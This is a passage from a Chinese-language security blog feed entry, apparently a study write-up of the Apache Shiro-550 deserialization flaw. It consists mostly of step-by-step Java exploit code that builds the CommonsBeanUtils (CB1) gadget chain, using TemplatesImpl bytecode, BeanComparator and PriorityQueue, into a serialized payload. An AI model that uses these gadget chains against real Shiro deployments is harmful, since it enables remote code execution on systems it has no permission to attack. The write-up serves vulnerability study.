class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,invokerTransformer);</span><br><span class="line">        <span class="comment">//绕过IF判断，调用Transform</span></span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">       serialize(hashMap1);</span><br><span class="line">        <span class="comment">// unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001180401-312875f7-c0f9-4c4d-a815-04167e5add64.png" alt="image.png"></p><h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><p>CB1链是完全只需要Shiro自带依赖，就可以打通的链子，用到的模块是Commons BeanUtils<br>这个模块有个PropertyUtils.getProperty()可以根据传参调用对应的getter方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694001350649-32b68692-39fa-42b4-a4ab-5d663a366625.png#averageHue=%236dab6a&clientId=ue6e9373e-da05-4&from=paste&height=245&id=ub9e27978&originHeight=306&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50083&status=done&style=none&taskId=u79659392-fd70-47aa-a783-9369b62b04f&title=&width=1071.2" alt="image.png"><br>在CC3的TemplatesImpl#newTransformer()里提到，调用newTransformer的还有getOutputProperties这个方法，换言之通过getOutputProperties也可代码执行，尝试编写Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTrnasformer()看一眼效果，就要设置_tfactory</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001786024-862a8044-59ae-4816-88db-0edfc788922b.png" alt="image.png"><br>那么又因为PropertyUtils.getProperty()可以调用任意getter方法，尝试一下调用getOutputProperties()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTrnasformer()看一眼效果，就要设置_tfactory</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">       PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001928851-8156d309-1739-415b-87d5-5b5dcac9c973.png" alt="image.png"><br>接下来，开始找谁调用了getProperty，这里发现了BeanComparator#compare，很符合我们要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694002167720-97c47687-39cd-4509-b9d9-600979d5ce47.png" alt="image.png"><br>看到compare就很熟悉，在CC4的priorityQueue这个入口类里，我们用到过compare来触发xxx.transform<br>在CB1链里，我们只需要使用priorityQueue反序列化时，会调用到compare这个特性即可<br><strong>注意：下面的add会提前触发链条，这里选择先add，再通过反射设置属性，保证链子不被破坏。</strong><br>最终Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// 提前触发链条看效果，就要设置_tfactory</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"><span class="comment">//        templates.getOutputProperties();</span></span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"><span class="comment">//        setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span></span><br><span class="line"><span class="comment">//        beanComparator.compare(templates,templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // add会提前触发链条，这里选择先提前add，再统一传参</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        // 统一传参，防止链条被破坏</span></span><br><span class="line">        setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>[]&#123;templates,templates&#125;);</span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">       serialize(priorityQueue);</span><br><span class="line">        <span class="comment">// unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694003006742-1a409a1f-5c46-4f8e-a48a-8ee199c68567.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>shiro550这个洞，就是反序列化套了一层AES加密，AES密钥已知的基础上，本质就是一个简单的反序列化漏洞。<br>感觉更多的是考察在Shiro的依赖条件下，要怎么RCE，通过这个洞学到了URLDNS、CC8、CB1三条链子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1iF411b7bD&quot;&gt;https://</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Shiro" scheme="https://jaspersec.top/tags/Shiro/"/>
    
  </entry>
  
</feed>
